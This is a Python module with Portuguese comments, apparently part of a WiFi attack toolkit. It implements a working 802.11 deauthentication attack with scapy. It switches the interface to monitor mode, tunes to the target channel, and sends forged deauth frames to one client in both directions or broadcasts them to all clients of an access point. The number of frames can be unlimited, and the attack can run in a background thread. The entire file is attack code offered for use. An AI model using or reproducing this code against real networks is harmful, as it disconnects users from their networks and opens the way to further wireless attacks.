#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Módulo para realizar ataques de desautenticação em redes WiFi.
Este módulo envia pacotes de desautenticação para forçar a desconexão de dispositivos de uma rede WiFi.
"""

import os
import sys
import time
import threading
from scapy.all import *
from scapy.layers.dot11 import RadioTap, Dot11, Dot11Deauth

# Importa módulos internos
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '../..')))
from src.utils.logger import Logger
from src.utils.helpers import enable_monitor_mode, disable_monitor_mode, validate_mac_address

class DeauthAttack:
    """Classe para realizar ataques de desautenticação em redes WiFi."""
    
    def __init__(self, interface=None, target_bssid=None, target_client=None, 
                 channel=None, count=0, interval=0.1, logger=None):
        """
        Inicializa o ataque de desautenticação.
        
        Args:
            interface (str): Interface de rede WiFi a ser utilizada.
            target_bssid (str): BSSID (MAC) do ponto de acesso alvo.
            target_client (str): MAC do cliente alvo (se None, ataca todos os clientes).
            channel (int): Canal do AP alvo.
            count (int): Número de pacotes a serem enviados (0 = infinito).
            interval (float): Intervalo entre os pacotes em segundos.
            logger (Logger): Instância do logger para registrar eventos.
        """
        self.interface = interface
        self.target_bssid = target_bssid
        self.target_client = target_client
        self.channel = channel
        self.count = count
        self.interval = interval
        self.logger = logger if logger else Logger(verbose=True)
        self.running = False
        self.original_interface_name = interface
        self.sent_packets = 0
    
    def _validate_params(self):
        """
        Valida os parâmetros do ataque.
        
        Returns:
            bool: True se os parâmetros são válidos, False caso contrário.
        """
        if not self.interface:
            self.logger.error("Interface de rede não especificada.")
            return False
        
        if not self.target_bssid:
            self.logger.error("BSSID do AP alvo não especificado.")
            return False
        
        if not validate_mac_address(self.target_bssid):
            self.logger.error(f"BSSID inválido: {self.target_bssid}")
            return False
        
        if self.target_client and not validate_mac_address(self.target_client):
            self.logger.error(f"MAC do cliente alvo inválido: {self.target_client}")
            return False
        
        if self.channel and (self.channel < 1 or self.channel > 14):
            self.logger.error(f"Canal inválido: {self.channel}. Deve estar entre 1 e 14.")
            return False
        
        return True
    
    def _set_channel(self):
        """
        Define o canal da interface WiFi.
        
        Returns:
            bool: True se bem-sucedido, False caso contrário.
        """
        if not self.channel:
            self.logger.warning("Canal não especificado. Mantendo o canal atual.")
            return True
        
        try:
            if os.system(f"iwconfig {self.interface} channel {self.channel} > /dev/null 2>&1") != 0:
                self.logger.error(f"Erro ao definir canal {self.channel}.")
                return False
            
            self.logger.debug(f"Interface {self.interface} configurada no canal {self.channel}.")
            return True
        except Exception as e:
            self.logger.error(f"Erro ao definir canal: {e}")
            return False
    
    def _create_deauth_packet(self, target_mac):
        """
        Cria um pacote de desautenticação.
        
        Args:
            target_mac (str): Endereço MAC do cliente alvo.
            
        Returns:
            Packet: Pacote de desautenticação.
        """
        # Código de motivo 7: Estação saindo
        return RadioTap() / Dot11(
            type=0,  # management
            subtype=12,  # deauth
            addr1=target_mac,  # Destinatário (cliente)
            addr2=self.target_bssid,  # Fonte (AP)
            addr3=self.target_bssid  # BSSID
        ) / Dot11Deauth(reason=7)
    
    def _send_deauth_packets(self):
        """Envia pacotes de desautenticação para os alvos definidos."""
        if self.target_client:
            # Desautentica um cliente específico
            packet = self._create_deauth_packet(self.target_client)
            reverse_packet = RadioTap() / Dot11(
                type=0, subtype=12,
                addr1=self.target_bssid,  # AP como destinatário
                addr2=self.target_client,  # Cliente como fonte
                addr3=self.target_bssid
            ) / Dot11Deauth(reason=7)
            
            self.logger.attack(f"Iniciando ataque de desautenticação contra {self.target_client} na rede {self.target_bssid}...")
            
            # Envia pacotes em ambas as direções (AP -> Cliente e Cliente -> AP)
            sent = 0
            while self.running:
                if self.count > 0 and sent >= self.count:
                    break
                
                sendp(packet, iface=self.interface, verbose=False)
                sendp(reverse_packet, iface=self.interface, verbose=False)
                sent += 2
                self.sent_packets += 2
                
                if sent % 20 == 0:  # A cada 10 pacotes (20 considerando os dois sentidos)
                    self.logger.debug(f"Enviados {sent} pacotes de desautenticação...")
                
                time.sleep(self.interval)
        else:
            # Ataque de broadcast (todos os clientes)
            packet = self._create_deauth_packet("ff:ff:ff:ff:ff:ff")
            
            self.logger.attack(f"Iniciando ataque de desautenticação em broadcast contra a rede {self.target_bssid}...")
            
            sent = 0
            while self.running:
                if self.count > 0 and sent >= self.count:
                    break
                
                sendp(packet, iface=self.interface, verbose=False)
                sent += 1
                self.sent_packets += 1
                
                if sent % 10 == 0:
                    self.logger.debug(f"Enviados {sent} pacotes de desautenticação em broadcast...")
                
                time.sleep(self.interval)
    
    def start_attack(self):
        """
        Inicia o ataque de desautenticação.
        
        Returns:
            bool: True se o ataque foi iniciado com sucesso, False caso contrário.
        """
        # Valida os parâmetros
        if not self._validate_params():
            return False
        
        # Habilita o modo monitor
        self.logger.info(f"Habilitando modo monitor na interface {self.interface}...")
        success, monitor_interface = enable_monitor_mode(self.interface)
        
        if not success:
            self.logger.error(f"Falha ao habilitar modo monitor: {monitor_interface}")
            return False
        
        self.interface = monitor_interface
        self.logger.success(f"Modo monitor habilitado na interface {self.interface}")
        
        # Define o canal
        if self.channel and not self._set_channel():
            self.logger.error("Falha ao definir o canal. Continuando com o canal atual.")
        
        try:
            # Inicia o ataque
            self.running = True
            self._send_deauth_packets()
            
            return True
            
        except KeyboardInterrupt:
            self.logger.info("Ataque interrompido pelo usuário.")
        except Exception as e:
            self.logger.error(f"Erro durante o ataque: {e}")
        finally:
            self.stop_attack()
            return self.running
    
    def start_attack_async(self):
        """
        Inicia o ataque de desautenticação em uma thread separada.
        
        Returns:
            Thread: Thread do ataque ou None se falhou.
        """
        # Valida os parâmetros
        if not self._validate_params():
            return None
        
        # Habilita o modo monitor
        self.logger.info(f"Habilitando modo monitor na interface {self.interface}...")
        success, monitor_interface = enable_monitor_mode(self.interface)
        
        if not success:
            self.logger.error(f"Falha ao habilitar modo monitor: {monitor_interface}")
            return None
        
        self.interface = monitor_interface
        self.logger.success(f"Modo monitor habilitado na interface {self.interface}")
        
        # Define o canal
        if self.channel and not self._set_channel():
            self.logger.error("Falha ao definir o canal. Continuando com o canal atual.")
        
        # Inicia o ataque em uma thread separada
        self.running = True
        attack_thread = threading.Thread(target=self._send_deauth_packets)
        attack_thread.daemon = True
        attack_thread.start()
        
        return attack_thread
    
    def stop_attack(self):
        """Para o ataque de desautenticação e restaura o estado da interface."""
        self.running = False
        time.sleep(0.5)  # Garante que a thread tenha tempo para encerrar
        
        # Restaura o modo gerenciado
        self.logger.info("Desabilitando modo monitor...")
        disable_monitor_mode(self.interface)
        self.interface = self.original_interface_name
        
        self.logger.success(f"Ataque finalizado. Enviados {self.sent_packets} pacotes de desautenticação.") 